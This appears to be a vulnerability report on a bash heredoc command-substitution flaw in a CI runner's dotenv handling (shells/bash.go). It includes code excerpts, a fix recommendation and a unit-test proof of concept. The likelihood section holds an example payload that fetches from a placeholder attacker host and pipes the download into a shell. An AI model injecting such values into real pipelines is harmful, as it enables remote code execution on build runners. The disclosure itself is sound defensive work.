### Title
Unescaped `$()`/backtick command substitution in unquoted heredoc used by `BashWriter.DotEnvVariables` - ([File: shells/bash.go])

### Summary
`BashWriter.DotEnvVariables` builds a `cat << EOF > <file>` heredoc whose terminator is unquoted (`<< EOF`, not `<< 'EOF'`), so bash performs parameter/command substitution on the heredoc body before it is written to disk. `helpers.DotEnvEscape` only escapes backslashes, double quotes, `\n`/`\r`, but does not escape `$` or backticks, so a variable value containing `$(...)` or `` `...` `` is executed by the shell at script-eval time rather than being written verbatim.

### Finding Description
`DotEnvVariables` in `shells/bash.go` constructs:
```go
fmt.Fprintf(&sb, "cat << EOF > %s\n", dotEnvFile)
sb.WriteString(helpers.DotEnvEscape(variables))
sb.WriteString("EOF\n")
``` [1](#0-0) 

Because the delimiter `EOF` is unquoted, bash treats the heredoc body as subject to the same expansions as double-quoted text: variable expansion, command substitution (`` `cmd` `` and `$(cmd)`), and backslash escaping — everything except word splitting/globbing. `helpers.DotEnvEscape` writes each value inside literal double quotes but its replacer only escapes `\`, `"`, `\n`, `\r`:
```go
var escapeDotEnvValue = strings.NewReplacer(
	"\\", "\\\\",
	"\"", "\\\"",
	"\n", "\\n",
	"\r", "\\r",
).Replace
``` [2](#0-1) 

`$` and backtick characters pass through untouched. A value such as `` `id > /tmp/pwned` `` or `$(id > /tmp/pwned)` placed inside the double-quoted heredoc line `KEY="$(id > /tmp/pwned)"` is command-substituted by the shell while the heredoc is being consumed by `cat`, i.e., during execution of the generated script (`eval ...` in `BashWriter.Finish`), not merely when the resulting `.env` file is later sourced.

`isValidDotEnvKey` restricts keys to `[A-Za-z_][A-Za-z0-9_]*`, preventing key-based injection, and embedded newlines in values are escaped to the literal two-character sequence `\n`, preventing an attacker from injecting a bare `EOF` line to terminate the heredoc early. So the heredoc-terminator-collision part of the hypothesis is not exploitable — but the unescaped `$()`/backtick command-substitution path is real and independent of key/newline handling.

### Impact Explanation
Runner-side command execution occurs inside the job's shell context at script-execution time (inside the `eval`'d subshell), triggered purely by the *content* of a value that ends up in the `variables` map passed to `DotEnvVariables`. This matches the scoped impact: "runner-side command execution... via dotenv-report cross-stage injection" (or any other input path that funnels attacker-controlled strings into this map, e.g., artifact dotenv reports consumed and re-emitted as build variables for a subsequent job/stage).

### Likelihood Explanation
The attacker only needs to control a string that ends up in the `variables` map given to `DotEnvVariables` — e.g. by writing a `.env` file via `artifacts:reports:dotenv` with a value like `FOO=$(curl attacker.com/x | sh)`, which is a standard, documented, user-controllable CI feature. No special runner or admin privileges are required. This is straightforward to reproduce deterministically.

### Recommendation
Quote the heredoc delimiter (`cat << 'EOF' > %s`) so the shell does not perform any expansion on the body, or otherwise avoid a shell-expanded heredoc for verbatim data (e.g., write bytes via a helper program, `printf %s` per line with proper `ShellEscape`, or base64-encode/decode). If migrating away from the heredoc is not preferred, at minimum extend `escapeDotEnvValue`/`DotEnvEscape` to escape `$` and `` ` `` as well, matching the fix already applied for `\`, `"`, `\n`, `\r`.

### Proof of Concept
Go unit test analogous to existing tests in `shells/bash_test.go` for `DotEnvVariables`:
```go
func TestDotEnvVariables_CommandSubstitutionInjection(t *testing.T) {
    w := NewBashWriter(mockBuild(), "bash")
    file := w.DotEnvVariables("out.env", map[string]string{
        "FOO": "$(touch /tmp/pwned)",
    })
    script := w.String()

    // Assert the generated script still contains an unquoted heredoc delimiter
    require.Contains(t, script, "cat << EOF")
    // Assert the raw payload is emitted verbatim without escaping $ or backticks
    require.Contains(t, script, `FOO="$(touch /tmp/pwned)"`)

    // Execute the generated script under bash and assert /tmp/pwned was created,
    // proving command substitution executed at script-eval time rather than
    // being written literally into out.env.
}
```
Expected assertions: (a) after fixing (quoting the heredoc delimiter or escaping `$`/backtick), `/tmp/pwned` is NOT created and the literal string `$(touch /tmp/pwned)` appears verbatim inside `out.env`; (b) before the fix, the file `/tmp/pwned` is created, proving runner-side command execution.

func DotEnvEscape(variables map[string]string) string {
	var sb strings.Builder

	// Sort variables to get deterministic output
	keys := make([]string, 0, len(variables))
	for key := range variables {
		keys = append(keys, key)
	}
	sort.Strings(keys)

	for _, key := range keys {
		if !isValidDotEnvKey(key) {
			// Skip invalid keys
			continue
		}

		value := variables[key]
		fmt.Fprintf(&sb, "%s=\"%s\"\n", key, escapeDotEnvValue(value))
	}

	return sb.String()
}
